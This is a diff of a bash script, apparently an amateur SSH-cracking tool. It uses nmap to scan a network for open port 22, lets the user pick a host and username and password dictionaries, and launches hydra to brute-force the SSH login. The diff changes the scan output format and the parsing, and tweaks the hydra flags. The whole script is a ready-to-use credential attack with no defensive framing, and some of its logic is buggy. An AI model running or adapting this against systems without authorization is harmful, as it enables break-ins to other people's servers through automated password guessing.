@@ -31,23 +31,23 @@ do
 done
 
 #---------------------------------Scann the network------------------------------
-rm result/scanNetwork/scanSSH 2> /dev/null
+#rm result/scanNetwork/scanSSH 2> /dev/null
 
 # -p 22 because 22 is the ssh port
-# -oX because we want a XML output file, it's easier to manipulate
+# -oG because we want a "grepable" output file, it's easier to manipulate with bash
 # for more information go to https://nmap.org/ or see nmap -h
-nmap -p 22 $networkC --open -oX result/scanNetwork/scanSSH
-echo "sudo nmap -p 22 $networkC -oX --open"
+#nmap -p 22 $networkC -oG result/scanNetwork/scanSSH
+echo "sudo nmap -p 22 $networkC -oG result/scanNetwork/scanSSH"
 declare -a hostnamesArray
-hostnamesArray=($(xml_grep 'hostname' result/scanNetwork/scanSSH | grep "hostname" | cut -d '"' -f2))
-statesArray=($(xml_grep 'state' result/scanNetwork/scanSSH | grep "state" | cut -d '"' -f 6))
-addressArray=($(xml_grep 'address' result/scanNetwork/scanSSH | grep "address" | cut -d '"' -f2))
+hostnamesArray=($(cat result/scanNetwork/scanSSH | grep "Ports" | cut -d "(" -f 2 | cut -d ")" -f 1))
+statesArray=($(cat result/scanNetwork/scanSSH | grep "Ports" | cut -d " " -f 4 | cut -d "/" -f 2))
+addressArray=($(cat result/scanNetwork/scanSSH | grep "Ports" | cut -d " " -f 2))
 
 #---------------------------------User select a target------------------------------
 ans="n"
 i=0
 # set how many host you can see in the same time on the screen
-if [ ${#statesArray[@]} -gt 4 ]; then 
+if [ ${#statesArray[@]} -gt 4 ]; then
 	nDisplay=4
 else
 	nDisplay=$((${#statesArray[@]}-1))
@@ -61,11 +61,11 @@ do
 	else
 		colorS=$red
 	fi
-	
+
 	echo -e $bReverse""${hostnamesArray[i]}" "$transparent"state: "$colorS" "${statesArray[i]}$transparent
 	echo "|-> adress "${addressArray[i]}
 
-	for j in `seq $(($i+1)) $nDisplay`; 
+	for j in `seq $(($i+1)) $nDisplay`;
 	do
 		modJ=$(($j % ${#statesArray[@]}))
 		if [  ${statesArray[$modJ]} = "open" ]; then
@@ -76,7 +76,7 @@ do
 		echo -e "${hostnamesArray[modJ]}" "state: "$colorS" "${statesArray[modJ]}$transparent
 		echo "|-> adress "${addressArray[modJ]}
 	done
-	
+
 	read ans
 	if [ $ans = "y" ]; then
 		break
@@ -95,7 +95,7 @@ echo -e "Now if you$red don't know$transparent the username press n"
 read ans
 if [ $ans = "n" ]; then
 	dicoArray=($(ls conf/dico))
-	if [ ${#dicoArray[@]} -gt 8 ]; then 
+	if [ ${#dicoArray[@]} -gt 8 ]; then
 		nDisplay=4
 	else
 		nDisplay=$((${#dicoArray[@]}-1))
@@ -109,7 +109,7 @@ if [ $ans = "n" ]; then
 		echo "please select a dictionnary :"
 		echo -e $bReverse""${dicoArray[k]}" "$transparent
 
-		for j in `seq $(($k+1)) $nDisplay`; 
+		for j in `seq $(($k+1)) $nDisplay`;
 		do
 			modJ=$(($j % ${#dicoArray[@]}))
 			echo ${dicoArray[modJ]}
@@ -126,8 +126,8 @@ if [ $ans = "n" ]; then
 	echo "sed -i "1i${hostnamesArray[i]}" "$username""
 	bool="1"
 	username="-L '$username'"
-	
-	
+
+
 else
 	clear
 	echo "please enter the username :"
@@ -143,7 +143,7 @@ read ans
 echo $ans
 if [ $ans = "n" ] ; then
 	dicoArray=($(ls conf/dico))
-	if [ ${#dicoArray[@]} -gt 8 ]; then 
+	if [ ${#dicoArray[@]} -gt 8 ]; then
 		nDisplay=4
 	else
 		nDisplay=$((${#dicoArray[@]}-1))
@@ -156,12 +156,12 @@ if [ $ans = "n" ] ; then
 		echo "please select a dictionnary :"
 		echo -e $bReverse""${dicoArray[p]}" "$transparent
 
-		for j in `seq $(($p+1)) $nDisplay`; 
+		for j in `seq $(($p+1)) $nDisplay`;
 		do
 			modJ=$(($j % ${#dicoArray[@]}))
 			echo ${dicoArray[modJ]}
 		done
-		
+
 		read ans
 		if [ $ans = "y" ]; then
 			break
@@ -170,8 +170,8 @@ if [ $ans = "n" ] ; then
 		fi
 	done
 	password=$PWD"/conf/dico/"${dicoArray[p]}
-	password="-P '$password'"
-	
+	password="-P "$password
+
 else
 	clear
 	echo "please enter the password :"
@@ -182,26 +182,9 @@ fi
 echo $username
 echo $password
 
-echo hydra -s 22 -v $username $password -e nsr -F ${addressArray[i]} ssh -I
-hydra -s 22 -v $username $password -e nsr -F ${addressArray[i]} ssh -I
+echo "hydra ${addressArray[i]} ssh -vV $username -P $password -e s -t 10"
+hydra ${addressArray[i]} ssh -vV $username $password -e s -t 10 -I
 # Supress the line we hadded in the user dictionnary
 if [ bool = '1' ]; then
 	sed -i '1d' "conf/dico/${dicoArray[k]}"
 fi
-
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-
